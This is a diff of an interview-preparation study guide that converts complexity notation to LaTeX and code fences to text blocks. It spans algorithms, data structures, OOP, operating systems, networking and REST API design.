+| Merge Sort | $O(n\log n)$ | $O(n\log n)$ | $O(n\log n)$ | $O(n)$ | Yes |
+| Quick Sort | $O(n\log n)$ | $O(n\log n)$ | $O(n^2)$ | $O(\log n)$ | No |
+| Heap Sort | $O(n\log n)$ | $O(n\log n)$ | $O(n\log n)$ | $O(1)$ | No |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1200,7 +1198,7 @@ def merge_sort(arr):
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-You're rarely asked to implement sort from scratch, but you're expected to reach for "sort first" as an opening move - many problems that look O(n^2) become O(n log n) the instant you sort and apply two pointers.
+You're rarely asked to implement sort from scratch, but you're expected to reach for "sort first" as an opening move - many problems that look $O(n^2)$ become $O(n\log n)$ the instant you sort and apply two pointers.
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
@@ -1215,7 +1213,7 @@ You're rarely asked to implement sort from scratch, but you're expected to reach
 
 ## 7.2 Binary Search
 
-**WHY YOU ARE LEARNING THIS:** Sorting bought you order; binary search is what you spend that order on. Instead of scanning a sorted array left to right (O(n)), check the middle element and immediately discard half the remaining array based on one comparison - the same halving logic baked into a BST's shape (Phase 5), performed here on a flat, sorted array.
+**WHY YOU ARE LEARNING THIS:** Sorting bought you order; binary search is what you spend that order on. Instead of scanning a sorted array left to right ($O(n)$), check the middle element and immediately discard half the remaining array based on one comparison - the same halving logic baked into a BST's shape (Phase 5), performed here on a flat, sorted array.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -1228,7 +1226,7 @@ You're rarely asked to implement sort from scratch, but you're expected to reach
 
 **STEP-BY-STEP EXPLANATION**
 
-Binary search maintains `low`/`high` boundaries over a sorted range. At each step, check the middle: if it's the target, done; if the target is smaller, discard the right half; if larger, discard the left half. Each comparison halves the search space - O(log n) instead of O(n).
+Binary search maintains `low`/`high` boundaries over a sorted range. At each step, check the middle: if it's the target, done; if the target is smaller, discard the right half; if larger, discard the left half. Each comparison halves the search space - $O(\log n)$ instead of $O(n)$.
 
 **PICTURE IT LIKE THIS**
 
@@ -1236,7 +1234,7 @@ Binary search maintains `low`/`high` boundaries over a sorted range. At each ste
 
 **Internal Working, Step by Step**
 
-```
+```text
 [1, 3, 5, 7, 9, 11, 13, 15, 17, 19]   target = 13
 
 step 1: mid = index 4 (value 9)   9 < 13  -> search RIGHT half
@@ -1251,9 +1249,9 @@ step 3: mid = 13 -> FOUND
 
 | Case | Cost |
 | --- | --- |
-| Best | O(1) - target is the first middle checked |
-| Average / Worst | O(log n) |
-| Space | O(1) iterative, O(log n) recursive |
+| Best | $O(1)$ - target is the first middle checked |
+| Average / Worst | $O(\log n)$ |
+| Space | $O(1)$ iterative, $O(\log n)$ recursive |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1323,7 +1321,7 @@ A graph is a pair: a set of vertices, and a set of edges connecting them. Every 
 - **Directed or undirected.** In a directed graph, an edge from A to B does not imply an edge from B to A. "Alice follows Bob" is directed; "Alice and Bob are friends" is undirected. An undirected graph is usually stored as a directed graph with both edges present.
 - **Weighted or unweighted.** An unweighted edge only says "these two are connected." A weighted edge attaches a number: distance, cost, capacity, latency. This one property decides which shortest-path algorithm you are allowed to use, because BFS assumes every edge costs the same.
 - **Cyclic or acyclic.** A cycle is a path that returns to where it started. Cycles are why graph traversal needs a `visited` set and tree traversal does not. A directed graph with no cycles (a DAG) is special enough to have its own tools, most importantly topological sort.
-- **Dense or sparse.** A graph with `V` vertices can have at most roughly `V^2` edges. If the actual edge count is near that maximum it is dense; if it is closer to `V` it is sparse. Real graphs are almost always sparse, which is the entire reason the adjacency list wins in practice.
+- **Dense or sparse.** A graph with $V$ vertices can have at most roughly $V^2$ edges. If the actual edge count is near that maximum it is dense; if it is closer to $V$ it is sparse. Real graphs are almost always sparse, which is the entire reason the adjacency list wins in practice.
 
 The two representations below are not competing answers to one question. They are answers to two different questions: "who are this node's neighbors?" (adjacency list, fast) versus "are these two specific nodes connected?" (adjacency matrix, fast). Pick based on which question your algorithm asks most.
 
@@ -1333,7 +1331,7 @@ An adjacency list is a phone's contact list: for each person you know, you store
 
 **Diagram - one graph, drawn three ways:**
 
-```
+```text
 The graph itself (undirected, unweighted, 4 vertices, 3 edges):
 
         A
@@ -1370,7 +1368,7 @@ Weighted variant (add a cost to each edge):
 
 **Internal Working - the two representations that matter in practice:**
 
-```
+```text
 Adjacency List (the default choice  space-efficient for sparse graphs)
 A: [B, C]
 B: [A, D]
@@ -1390,11 +1388,11 @@ Almost every real interview and real system uses an adjacency list, because most
 
 | Operation | Adjacency List | Adjacency Matrix |
 | --- | --- | --- |
-| Space | O(V + E) | O(V^2) |
-| Check if edge (u, v) exists | O(degree of u) | O(1) |
-| Iterate all neighbors of u | O(degree of u) | O(V) |
-| Add an edge | O(1) | O(1) |
-| Add a vertex | O(1) | O(V^2) - the whole matrix must be resized |
+| Space | $O(V+E)$ | $O(V^2)$ |
+| Check if edge (u, v) exists | $O(\deg(u))$ | $O(1)$ |
+| Iterate all neighbors of u | $O(\deg(u))$ | $O(V)$ |
+| Add an edge | $O(1)$ | $O(1)$ |
+| Add a vertex | $O(1)$ | $O(V^2)$ - the whole matrix must be resized |
 
 The crossover point is edge density. A matrix only pays for itself when the graph is dense enough that most cells are actually used, or when the algorithm's inner loop asks "is there an edge here?" far more often than it asks "who are the neighbors?" (the Floyd-Warshall all-pairs shortest-path algorithm is the classic example). Everything else uses a list.
 
@@ -1441,11 +1439,11 @@ print(g.neighbors('A'))                                  # ['B', 'C']
 print(build_matrix([('A','B'),('A','C'),('B','D')], ['A','B','C','D']))
 # [[0, 1, 1, 0], [1, 0, 0, 1], [1, 0, 0, 0], [0, 1, 0, 0]]
 ```
-A grid is a graph too, and this is the single most common disguise a graph wears in interviews. A cell at `(row, col)` in an `m x n` grid has up to four neighbors, `(row+1, col)`, `(row-1, col)`, `(row, col+1)`, `(row, col-1)`, and you never build an adjacency list at all: you compute the neighbors on demand. Recognizing "this maze/island/matrix problem is a graph problem" is worth more than memorizing any single graph algorithm.
+A grid is a graph too, and this is the single most common disguise a graph wears in interviews. A cell at `(row, col)` in an $m\times n$ grid has up to four neighbors, `(row+1, col)`, `(row-1, col)`, `(row, col+1)`, `(row, col-1)`, and you never build an adjacency list at all: you compute the neighbors on demand. Recognizing "this maze/island/matrix problem is a graph problem" is worth more than memorizing any single graph algorithm.
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-Almost no interviewer asks you to compare representations in the abstract. What they do instead is hand you a problem whose input is a list of pairs (`[[0,1],[1,2],[2,0]]`, "prerequisites," "flights," "friendships") and watch whether your first move is to build an adjacency list. Saying "let me convert this edge list into an adjacency map first" before writing any algorithm is a strong, immediate signal, because it shows you recognized the problem as a graph rather than trying to work directly off the raw input. The follow-up that separates candidates is being able to say *why* a list and not a matrix: "the graph is sparse, so a matrix would waste O(V^2) space to store almost nothing."
+Almost no interviewer asks you to compare representations in the abstract. What they do instead is hand you a problem whose input is a list of pairs (`[[0,1],[1,2],[2,0]]`, "prerequisites," "flights," "friendships") and watch whether your first move is to build an adjacency list. Saying "let me convert this edge list into an adjacency map first" before writing any algorithm is a strong, immediate signal, because it shows you recognized the problem as a graph rather than trying to work directly off the raw input. The follow-up that separates candidates is being able to say *why* a list and not a matrix: "the graph is sparse, so a matrix would waste $O(V^2)$ space to store almost nothing."
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
@@ -1453,7 +1451,7 @@ Almost no interviewer asks you to compare representations in the abstract. What 
 | --- | --- |
 | Easy | Convert an edge list `[[0,1],[1,2],[2,0]]` into both an adjacency list and an adjacency matrix by hand, then in code |
 | Easy | Find the Town Judge - a pure representation-and-degree-counting problem, no traversal needed |
-| Medium | Find Center of Star Graph - solvable in O(1) once you see what the edge list guarantees |
+| Medium | Find Center of Star Graph - solvable in $O(1)$ once you see what the edge list guarantees |
 | Medium | Given a grid of `0`s and `1`s, write only the `neighbors(row, col)` helper, with correct bounds checking, before writing any traversal |
 | Hard | Build a weighted, directed graph from a list of currency exchange rates, then state which representation you would choose and defend it against the alternative |
 
@@ -1487,7 +1485,7 @@ BFS is how ripples spread across a pond from a dropped stone - everything at dis
 
 **Internal Working, Step by Step (BFS on the graph above, starting at A):**
 
-```
+```text
 queue = [A], visited = {A}
 pop A -> visit neighbors B, C -> queue = [B, C], visited = {A, B, C}
 pop B -> visit neighbor D (A already visited) -> queue = [C, D], visited = {A, B, C, D}
@@ -1499,7 +1497,7 @@ DFS on the same graph, starting at A, would instead go A -> B -> D (as deep as p
 
 **Diagram - the same algorithm, one line different:**
 
-```
+```text
                     SHARED SKELETON
         +--------------------------------------+
         | container = [start]; visited = {start}|
@@ -1549,8 +1547,8 @@ every node at distance 1.             this path found D at depth 3,
 
 | Operation | Cost |
 | --- | --- |
-| BFS / DFS, full traversal | O(V + E) - every vertex and every edge visited once |
-| Space (BFS queue / DFS recursion stack, worst case) | O(V) |
+| BFS / DFS, full traversal | $O(V+E)$ - every vertex and every edge visited once |
+| Space (BFS queue / DFS recursion stack, worst case) | $O(V)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1580,7 +1578,7 @@ def dfs(graph, start, visited=None, order=None):
     return order
 ```
 
-**Before vs. After / Trade-off:** BFS guarantees the *shortest path* in an unweighted graph (because it explores in strict order of distance) at the cost of O(V) queue memory that can spike wide for bushy graphs. DFS uses less memory for deep, narrow graphs and is the natural fit for "does a path exist" or "find all connected components," but gives no shortest-path guarantee.
+**Before vs. After / Trade-off:** BFS guarantees the *shortest path* in an unweighted graph (because it explores in strict order of distance) at the cost of $O(V)$ queue memory that can spike wide for bushy graphs. DFS uses less memory for deep, narrow graphs and is the natural fit for "does a path exist" or "find all connected components," but gives no shortest-path guarantee.
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
@@ -1596,7 +1594,7 @@ def dfs(graph, start, visited=None, order=None):
 | Hard | Word Ladder (shortest transformation, BFS) |
 | Hard | Network Delay Time (Dijkstra's algorithm) |
 
-**WHY THE NEXT TOPIC IS NEEDED - Algorithmic Patterns:** Graphs, trees, and recursion all share a hidden cost you haven't confronted yet: naive recursion can revisit the *same subproblem* many times (naive Fibonacci does this - Phase 4 flagged it as O(2^n) and promised a fix). The fix - remembering answers you've already computed - is the first algorithmic pattern: Dynamic Programming.
+**WHY THE NEXT TOPIC IS NEEDED - Algorithmic Patterns:** Graphs, trees, and recursion all share a hidden cost you haven't confronted yet: naive recursion can revisit the *same subproblem* many times (naive Fibonacci does this - Phase 4 flagged it as $O(2^n)$ and promised a fix). The fix - remembering answers you've already computed - is the first algorithmic pattern: Dynamic Programming.
 
 ---
 
@@ -1614,7 +1612,7 @@ def dfs(graph, start, visited=None, order=None):
 
 ## 9.1 Dynamic Programming
 
-**WHY YOU ARE LEARNING THIS:** Naive recursive Fibonacci (Phase 4) is O(2^n) because `fib(5)` calls `fib(3)` *twice* once through `fib(4)`, once directly - and each of those calls redundantly recomputes everything below it. Dynamic Programming (DP) is nothing more than recursion plus a memory: the moment you notice a recursive solution asks the exact same question more than once, store the answer the first time and look it up every time after. This single idea turns a wide class of exponential brute-force solutions into polynomial ones.
+**WHY YOU ARE LEARNING THIS:** Naive recursive Fibonacci (Phase 4) is $O(2^n)$ because `fib(5)` calls `fib(3)` *twice* once through `fib(4)`, once directly - and each of those calls redundantly recomputes everything below it. Dynamic Programming (DP) is nothing more than recursion plus a memory: the moment you notice a recursive solution asks the exact same question more than once, store the answer the first time and look it up every time after. This single idea turns a wide class of exponential brute-force solutions into polynomial ones.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -1637,7 +1635,7 @@ Two conditions must both hold before DP applies, and checking them explicitly is
 Once both hold, there are exactly two ways to implement the cache, and they differ in one practical respect:
 
 - **Memoization (top-down)** keeps your recursion exactly as written and adds a dictionary check at the top. It only ever computes the subproblems your specific input actually needs, which matters when the state space is huge but sparsely visited. The cost is recursion depth, so a deep problem can still overflow the stack from Phase 1.
-- **Tabulation (bottom-up)** throws away the recursion and fills an array from the smallest subproblem to the largest, in an order you choose. There is no stack risk and the constant factors are lower, and it opens the door to space optimization: if `dp[i]` only ever reads `dp[i-1]` and `dp[i-2]`, you do not need the whole array, only two variables, which drops space from O(n) to O(1).
+- **Tabulation (bottom-up)** throws away the recursion and fills an array from the smallest subproblem to the largest, in an order you choose. There is no stack risk and the constant factors are lower, and it opens the door to space optimization: if `dp[i]` only ever reads `dp[i-1]` and `dp[i-2]`, you do not need the whole array, only two variables, which drops space from $O(n)$ to $O(1)$.
 
 The practical workflow that produces a correct DP solution every time: write the brute-force recursion, identify the parameters that actually change between calls (those parameters *are* your state), add a cache keyed on exactly those parameters, and only then, if you want, convert to a table. Skipping to the table is how people end up with a recurrence they cannot explain or debug.
 
@@ -1647,7 +1645,7 @@ DP is not a different way of thinking about a problem - it's the *same* recursiv
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Naive recursive Fibonacci
 Time: O(2^n)
 Why: fib(n) branches into fib(n-1) and fib(n-2), and those branches
@@ -1665,7 +1663,7 @@ Why: each distinct subproblem fib(k) is computed exactly once, then
 
 **Internal Working, Step by Step**
 
-```
+```text
 fib(5) without memo:                    fib(5) with memo (cache = {}):
       fib(5)                                  fib(5)
      /      \                                /      \
@@ -1684,9 +1682,9 @@ Answering the same trivia question for the tenth time by re-deriving it from scr
 
 | Approach | Time | Space |
 | --- | --- | --- |
-| Naive recursion (overlapping subproblems) | Exponential, e.g. O(2^n) | O(n) call stack |
-| Memoized (top-down DP) | O(number of distinct subproblems) | O(subproblems) for cache + O(depth) call stack |
-| Tabulated (bottom-up DP) | Same as memoized | Often reducible to O(1) or O(k) if only the last few states are needed |
+| Naive recursion (overlapping subproblems) | Exponential, e.g. $O(2^n)$ | $O(n)$ call stack |
+| Memoized (top-down DP) | $O(\text{number of distinct subproblems})$ | $O(\text{subproblems})$ for cache + $O(\text{depth})$ call stack |
+| Tabulated (bottom-up DP) | Same as memoized | Often reducible to $O(1)$ or $O(k)$ if only the last few states are needed |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1751,7 +1749,7 @@ Almost every greedy algorithm follows the same three-line shape: **sort by the r
 
 **Internal Working, Step by Step - interval scheduling, and why end time is the right sort key:**
 
-```
+```text
 Intervals (start, end):  (1,4)  (3,5)  (0,6)  (5,7)  (3,9)  (5,9)  (6,10)  (8,11)
 
 Sorted by END time:      (1,4)  (3,5)  (0,6)  (5,7)  (3,9)  (5,9)  (6,10)  (8,11)
@@ -1799,7 +1797,7 @@ Same algorithm, wrong sort key, silently wrong answer.
 
 **BEFORE VS. AFTER**
 
-```
+```text
 DP approach to "minimum coins for amount, coins = [1, 3, 4], amount = 6"
 Explores combinations, guaranteed correct for any coin system.
 Time: O(amount x number of coin types)
@@ -1824,8 +1822,8 @@ Making change with the fewest physical coins by always grabbing the biggest coin
 
 | Approach | Time | Guarantee |
 | --- | --- | --- |
-| Greedy | Usually O(n log n) (often dominated by an initial sort) | Correct ONLY when the greedy-choice property provably holds |
-| DP (same problem, general case) | Higher, e.g. O(n x target) | Always correct |
+| Greedy | Usually $O(n\log n)$ (often dominated by an initial sort) | Correct ONLY when the greedy-choice property provably holds |
+| DP (same problem, general case) | Higher, e.g. $O(n\times\text{target})$ | Always correct |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1875,7 +1873,7 @@ Interviewers expect you to justify *why* greedy works for the specific problem -
 
 Every backtracking solution is the same three-step skeleton applied inside a loop over the available choices:
 
-```
+```text
 for each candidate choice:
     if not valid(choice):  continue     # PRUNE: never even recurse
     make(choice)                        # CHOOSE
@@ -1908,7 +1906,7 @@ Think of backtracking as DFS (Phase 8) over a tree of *decisions* rather than a 
 
 **Internal Working, Step by Step (generating all subsets of `[1, 2]`):**
 
-```
+```text
                   []
           /               \
        [1]                 []          <- choose 1, or don't
@@ -1924,7 +1922,7 @@ exploring "choose 1," UNDO that choice (pop it off), then explore "don't choose 
 
 | Aspect | Cost |
 | --- | --- |
-| Time, worst case | Often exponential (O(2^n) for subsets, O(n!) for permutations) - inherent to exhaustive search |
+| Time, worst case | Often exponential ($O(2^n)$ for subsets, $O(n!)$ for permutations) - inherent to exhaustive search |
 | What pruning buys you | Cuts off entire invalid branches early; doesn't change the worst-case bound, but often the actual runtime dramatically |
 
 **SMALL WORKING EXAMPLE**
@@ -1960,7 +1958,7 @@ def subsets(nums):
 
 ## 9.4 Tries (Prefix Trees)
 
-**WHY YOU ARE LEARNING THIS:** A hash table (Phase 6) answers "is this exact word in the set" in O(1), but it cannot answer "what words start with this prefix" without scanning every entry - hashing deliberately destroys any relationship between similar keys. A trie is a tree (Phase 5) where each node represents one character, and any path from the root spells out a prefix; words that share a prefix literally share the same nodes in the tree. That shared structure is what makes prefix search fast and memory-efficient for large dictionaries.
+**WHY YOU ARE LEARNING THIS:** A hash table (Phase 6) answers "is this exact word in the set" in $O(1)$, but it cannot answer "what words start with this prefix" without scanning every entry - hashing deliberately destroys any relationship between similar keys. A trie is a tree (Phase 5) where each node represents one character, and any path from the root spells out a prefix; words that share a prefix literally share the same nodes in the tree. That shared structure is what makes prefix search fast and memory-efficient for large dictionaries.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -1978,8 +1976,8 @@ A trie node holds two things: a map from a single character to a child node, and
 
 The complexity comparison against a hash table (Phase 6) is genuinely interesting, because a trie is not simply better or worse:
 
-- **Exact lookup:** a hash map is O(1) on average but must hash the entire key first, which is itself O(L) work for a string of length L. A trie is O(L) with no hashing and no collision handling. In practice these are comparable, and the hash map usually wins on constant factors.
-- **Prefix lookup:** a trie is O(L) to reach the prefix node. A hash map cannot do this at all without scanning every key, which is O(total characters in the dictionary). This is not a constant-factor difference, it is the entire reason tries exist.
+- **Exact lookup:** a hash map is $O(1)$ on average but must hash the entire key first, which is itself $O(L)$ work for a string of length L. A trie is $O(L)$ with no hashing and no collision handling. In practice these are comparable, and the hash map usually wins on constant factors.
+- **Prefix lookup:** a trie is $O(L)$ to reach the prefix node. A hash map cannot do this at all without scanning every key, which is $O(\text{total characters in the dictionary})$. This is not a constant-factor difference, it is the entire reason tries exist.
 - **Memory:** a trie shares prefixes, so a dictionary of "car," "cars," "cart," "carts" stores `c-a-r` exactly once. But each node carries a map, and per-node overhead is real, so a trie over keys with *no* shared prefixes uses considerably more memory than a hash map would. Tries pay off precisely when the key set is prefix-dense, which is exactly what natural-language dictionaries are.
 - **Ordering:** a trie's children are naturally traversable in sorted order, so a depth-first walk emits every stored word alphabetically for free. A hash map has no order at all.
 
@@ -1991,7 +1989,7 @@ A trie is exactly how a phone's autocomplete works: typing "c-a-t" walks three n
 
 **Internal Working, Step by Step (inserting "cat" and "car"):**
 
-```
+```text
         root
          |
          c
@@ -2007,10 +2005,10 @@ A trie is exactly how a phone's autocomplete works: typing "c-a-t" walks three n
 
 | Operation | Cost |
 | --- | --- |
-| Insert a word of length L | O(L) |
-| Search for a word of length L | O(L) - not O(n) over all stored words |
-| Search for all words with a given prefix | O(L) to reach the prefix node, then O(nodes in that subtree) to collect matches |
-| Space | O(total characters across all inserted words), but shared prefixes are stored once |
+| Insert a word of length L | $O(L)$ |
+| Search for a word of length L | $O(L)$ - not $O(n)$ over all stored words |
+| Search for all words with a given prefix | $O(L)$ to reach the prefix node, then $O(\text{nodes in that subtree})$ to collect matches |
+| Space | $O(\text{total characters across all inserted words})$, but shared prefixes are stored once |
 
 **SMALL WORKING EXAMPLE**
 
@@ -2051,7 +2049,7 @@ class Trie:
 | Medium | Design Add and Search Words Data Structure |
 | Hard | Word Search II (trie + backtracking on a grid) |
 
-**MASTERY CHECKPOINT FOR PHASE 9:** Given an unsorted array, implement (1) a hash-map solution to find duplicates in O(n) (Phase 6), (2) a heap-based solution for the k largest elements (Phase 5), (3) merge sort by hand (Phase 7), and (4) a memoized recursive solution to a DP problem where you can point to exactly which subproblem was being recomputed in the naive version. If all four come out correct and you can state their complexity unprompted, you have the full data-structures-and-algorithms foundation the rest of this roadmap is built on.
+**MASTERY CHECKPOINT FOR PHASE 9:** Given an unsorted array, implement (1) a hash-map solution to find duplicates in $O(n)$ (Phase 6), (2) a heap-based solution for the k largest elements (Phase 5), (3) merge sort by hand (Phase 7), and (4) a memoized recursive solution to a DP problem where you can point to exactly which subproblem was being recomputed in the naive version. If all four come out correct and you can state their complexity unprompted, you have the full data-structures-and-algorithms foundation the rest of this roadmap is built on.
 
 **WHY THE NEXT TOPIC IS NEEDED - Phase 10:** Everything so far has been about a single function solving a single problem efficiently. Real software isn't one function - it's thousands of interacting pieces that need to stay organized, testable, and changeable over years, by teams of people who didn't write the original code. The discipline for organizing *code itself* not just data - is Object-Oriented Programming.
 
@@ -2095,7 +2093,7 @@ Three further distinctions carry real weight in interviews and in real code:
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Procedural style: data and behavior are separate
   balance = 100
   def withdraw(balance, amount): ...   <- anything, anywhere, can pass any value in
@@ -2144,7 +2142,7 @@ for animal in [Dog(), Cat()]:       # polymorphism: same call, different behavio
 
 **Internal Working, Step by Step - what actually happens when `Dog().speak()` runs:**
 
-```
+```text
 1. `Dog()` is called
    +-- the runtime allocates a new, empty object on the HEAP (Phase 1)
    +-- it records, inside that object, a pointer to the Dog CLASS
@@ -2257,7 +2255,7 @@ SOLID is the set of conventions that makes a building renovatable. Single Respon
 
 **Internal Working, Step by Step - Open/Closed and Dependency Inversion, as a diagram:**
 
-```
+```text
 BEFORE: the caller knows every concrete type. Adding one means editing it.
 
         +---------------------------+
@@ -2424,7 +2422,7 @@ Two more distinctions carry weight. **Concurrency is not parallelism**: concurre
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Before an OS abstraction: a program has direct, unrestricted hardware access
         Problem: one buggy or malicious program can read/corrupt another
         program's memory, or hog the CPU forever, freezing the whole machine.
@@ -2439,7 +2437,7 @@ turn on the CPU (a "context switch"), so no one process can permanently hog it.
 
 **Process vs. Thread:** A process is a fully isolated unit - its own memory space, its own everything. A **thread** is a lighter-weight unit of execution *within* a process - multiple threads in the same process share that process's memory space, which makes communication between them cheap (just shared variables) but reintroduces the exact isolation problem processes were built to solve: two threads can now race to modify the same memory at the same time.
 
-```
+```text
 ONE PROCESS, ONE THREAD              ONE PROCESS, THREE THREADS
 +---------------------------+        +---------------------------------------+
 | Process 1234              |        | Process 1234                          |
@@ -2491,7 +2489,7 @@ A process is like a separate office building - the people (threads) inside can f
 
 **Internal Working - a context switch, step by step:**
 
-```
+```text
 CPU running Process A's thread
         |
    Timer interrupt fires (A's time slice is up), or A blocks on I/O
@@ -2587,9 +2585,9 @@ The threads print one shared, incrementing counter. The processes each print `1`
 
 **STEP-BY-STEP EXPLANATION**
 
-Address translation works by splitting every virtual address into two parts. The low bits are the **offset** within a page, and the high bits are the **virtual page number**. With 4 KB pages, the low 12 bits are the offset (because 2^12 = 4096) and everything above is the page number. Translation therefore never touches the offset: it looks up the page number in a page table to find a physical frame number, then concatenates that frame number with the untouched offset. This is why page size and the offset width are the same fact stated twice.
+Address translation works by splitting every virtual address into two parts. The low bits are the **offset** within a page, and the high bits are the **virtual page number**. With 4 KB pages, the low 12 bits are the offset (because $2^{12}=4096$) and everything above is the page number. Translation therefore never touches the offset: it looks up the page number in a page table to find a physical frame number, then concatenates that frame number with the untouched offset. This is why page size and the offset width are the same fact stated twice.
 
-The obvious problem with that scheme is table size. A 48-bit virtual address space with 4 KB pages has 2^36 pages, which at 8 bytes per entry would be a 512 GB page table per process. The fix is a **multi-level page table**: the page number is itself split into several indices, each selecting an entry in a smaller table that points to the next level down. Most of the address space is unmapped, so most of those intermediate tables never need to exist at all, and the table's size becomes proportional to how much memory the process actually uses rather than to how much it could theoretically address. x86-64 uses four levels, which means a naive translation would take four memory reads before the real one.
+The obvious problem with that scheme is table size. A 48-bit virtual address space with 4 KB pages has $2^{36}$ pages, which at 8 bytes per entry would be a 512 GB page table per process. The fix is a **multi-level page table**: the page number is itself split into several indices, each selecting an entry in a smaller table that points to the next level down. Most of the address space is unmapped, so most of those intermediate tables never need to exist at all, and the table's size becomes proportional to how much memory the process actually uses rather than to how much it could theoretically address. x86-64 uses four levels, which means a naive translation would take four memory reads before the real one.
 
 That cost is what the **TLB** (translation lookaside buffer) exists to eliminate. It is a small, fully-associative hardware cache of recent virtual-page-to-physical-frame mappings, and on a hit, translation is effectively free. TLB hit rates above 99 percent are normal, which is the only reason paging is practical. It is also the hidden reason locality of reference matters so much for performance: an array traversal touches few pages and hits the TLB constantly, while chasing pointers through a linked list scattered across memory misses the TLB repeatedly and pays the multi-level walk each time. The linked-list-versus-array performance gap from Phase 3 is partly this.
 
@@ -2599,7 +2597,7 @@ Paging buys several things beyond isolation that are worth naming, because they 
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Direct physical addressing
         Problem: process isolation is impossible; also, a program needing
         more memory than physically exists simply cannot run.
@@ -2617,7 +2615,7 @@ Virtual memory (paging)
 
 **Internal Working, Step by Step**
 
-```
+```text
 Process A's virtual address 0x4000  --(page table lookup)-->  physical frame 17
 Process B's virtual address 0x4000  --(page table lookup)-->  physical frame 42
 
@@ -2627,7 +2625,7 @@ has mapped them to completely different, isolated physical locations.
 
 Drawn in full, with the address split made explicit:
 
-```
+```text
 A VIRTUAL ADDRESS, 4 KB pages (so a 12-bit offset):
 
      +----------------------------+------------------+
@@ -2819,7 +2817,7 @@ Deadlock has four necessary conditions, all of which must hold simultaneously, w
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Two threads both run: balance = balance + 10, unsynchronized
         Problem (race condition): "read balance" and "write balance" are
         each two separate machine steps. If Thread A reads balance (100),
@@ -2841,7 +2839,7 @@ A single-occupancy bathroom key: only the person holding the key can be inside; 
 
 **Internal Working - how a deadlock happens:**
 
-```
+```text
 Thread A: locks Resource 1, then tries to lock Resource 2
 Thread B: locks Resource 2, then tries to lock Resource 1
 
@@ -2852,7 +2850,7 @@ Neither can ever proceed -- this is a deadlock.
 
 Both failures, drawn on a timeline so the interleaving is visible:
 
-```
+```text
 THE RACE, instruction by instruction. balance starts at 100.
 Each thread runs three machine steps, and the OS may switch between ANY two.
 
@@ -3096,7 +3094,7 @@ Subnetting is where addressing becomes arithmetic. An address like `192.168.1.10
 
 **Mental Model - the layers that matter most in practice:**
 
-```
+```text
 Application  (HTTP, DNS, etc.)         "what does this message MEAN"
 Transport    (TCP, UDP)                "how do I get bytes there reliably (or fast)"
 Network      (IP)                      "which machine, among billions, is this for"
@@ -3106,7 +3104,7 @@ Each layer only needs to trust the layer below it to do its one job - the Applic
 
 **Internal Working, Step by Step - encapsulation, drawn as it actually appears on the wire:**
 
-```
+```text
 SENDING: your data descends, each layer ADDING its own header.
 
   APPLICATION   [ GET /index.html HTTP/1.1  Host: example.com ]
@@ -3297,7 +3295,7 @@ Two more distinctions matter in practice. TCP is a **stream** protocol with no m
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Raw, unreliable packet delivery (what the Network/IP layer alone gives you)
         Problem: packets can arrive late, out of order, duplicated, or not at all.
         A file transfer or a bank transaction absolutely cannot tolerate silent loss.
@@ -3318,7 +3316,7 @@ UDP (User Datagram Protocol)
 
 **Internal Working - the TCP three-way handshake:**
 
-```
+```text
 Client -> Server:  SYN  (synchronize; "I want to connect")
 Server -> Client:  SYN-ACK  (acknowledge, and synchronize back)
 Client -> Server:  ACK  (acknowledge; connection is now open)
@@ -3327,7 +3325,7 @@ Client -> Server:  ACK  (acknowledge; connection is now open)
 
 The full picture, from handshake to teardown, with UDP alongside for contrast:
 
-```
+```text
 TCP: CONNECTION SETUP, DATA, AND TEARDOWN
 
   CLIENT                                              SERVER
@@ -3582,7 +3580,7 @@ DNS also quietly does more than name resolution. Returning multiple A records fo
 
 **Internal Working, Step by Step (a simplified DNS lookup for "example.com"):**
 
-```
+```text
 Your computer asks a DNS resolver: "what's the IP for example.com?"
 resolver checks its cache -- if cached and not expired, return immediately (fast path)
         |  (cache miss)
@@ -3596,7 +3594,7 @@ authoritative server replies with the actual IP -- resolver caches it and return
 
 Drawn in full, with the cache layers that make the slow path rare:
 
-```
+```text
 THE CACHE LADDER. Each layer is checked in order, and most lookups
 never get past the first three.
 
@@ -3822,7 +3820,7 @@ The version history is worth knowing because each version is a fix for a measure
 
 **Internal Working, Step by Step - the full "type a URL and press enter" chain:**
 
-```
+```text
 1. Browser parses the URL, needs the server's IP  -> DNS lookup (Phase 12.3)
 2. Browser opens a TCP connection to that IP        -> three-way handshake (Phase 12.2)
 3. If HTTPS: a TLS handshake negotiates encryption   -> (Phase 15.1)
@@ -3838,7 +3836,7 @@ The version history is worth knowing because each version is a fix for a measure
 
 Drawn with the real bytes, the timing, and where each earlier phase contributes:
 
-```
+```text
 THE ACTUAL BYTES ON THE WIRE. HTTP/1.1 is plain text, which is why you
 can read it with your eyes and type it by hand into a socket.
 
@@ -4074,7 +4072,7 @@ Three more concerns separate a toy API from a real one. **Pagination** is mandat
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Ad hoc / RPC-style API
   /getUser?id=5
   /createUser
@@ -4100,7 +4098,7 @@ A well-designed REST API is also expected to use status codes meaningfully (not 
 
 **Internal Working, Step by Step - how one request becomes one row, and back:**
 
-```
+```text
 CLIENT                                                          SERVER
   |
   |  PATCH /v1/orders/9  HTTP/1.1
@@ -4434,7 +4432,7 @@ The relational model is not the only option, and knowing the alternatives by the
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Plain files (e.g. a CSV of users)
         Problem 1: two processes writing at once can corrupt the file
         (no built-in concurrency control -- exactly Phase 11.3's race
@@ -4463,7 +4461,7 @@ A database is a records office with a clerk who owns the cabinet. The clerk keep
 
